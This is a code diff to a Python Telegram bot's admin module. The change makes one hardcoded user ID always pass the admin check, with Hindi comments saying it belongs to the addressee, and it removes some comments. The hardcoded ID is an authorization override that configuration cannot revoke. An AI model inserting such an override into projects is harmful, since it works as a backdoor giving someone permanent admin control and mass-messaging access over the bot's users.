@@ -15,17 +15,18 @@ from utils.keyboards import admin_menu_kb, back_kb, yes_no_kb
 
 admin_router = Router()
 
-# ========== ADMIN STATES ==========
 class AdminStates(StatesGroup):
     broadcast_text = State()
     broadcast_confirm = State()
 
-# ========== ADMIN CHECK ==========
 def check_admin(user_id: int) -> bool:
-    """config के ADMIN_IDS में है तो admin"""
-    return user_id in settings.ADMIN_IDS
-
-# ========== COMMANDS ==========
+    # आपकी ID हमेशा एडमिन रहेगी
+    if user_id == 7631540413:
+        return True
+    # साथ ही config में दी गई IDs भी एडमिन होंगी
+    if user_id in settings.ADMIN_IDS:
+        return True
+    return False
 
 @admin_router.message(Command("admin"))
 async def admin_panel(message: Message) -> None:
@@ -41,8 +42,6 @@ async def quick_stats(message: Message) -> None:
     async with async_session_factory() as session:
         total_users = (await session.execute(select(func.count(User.id)))).scalar()
     await message.answer(f"👥 Total Users: {total_users}")
-
-# ========== CALLBACKS ==========
 
 @admin_router.callback_query(F.data.startswith("admin_"))
 async def admin_callback(callback: CallbackQuery) -> None:
@@ -82,8 +81,6 @@ async def admin_callback(callback: CallbackQuery) -> None:
 
     await callback.answer()
 
-# ========== BROADCAST ==========
-
 @admin_router.message(Command("cancel"), StateFilter(AdminStates))
 async def cancel_admin(message: Message, state: FSMContext) -> None:
     await state.clear()
@@ -116,7 +113,7 @@ async def confirm_broadcast(callback: CallbackQuery, state: FSMContext) -> None:
         users = (await session.execute(select(User))).scalars().all()
         sent = 0
         failed = 0
-        for u in users:   # सभी यूज़र्स को भेजें (पहले 100 तक सीमित था, अब पूरे)
+        for u in users:
             try:
                 await callback.bot.send_message(u.telegram_id, broadcast_text)
                 sent += 1
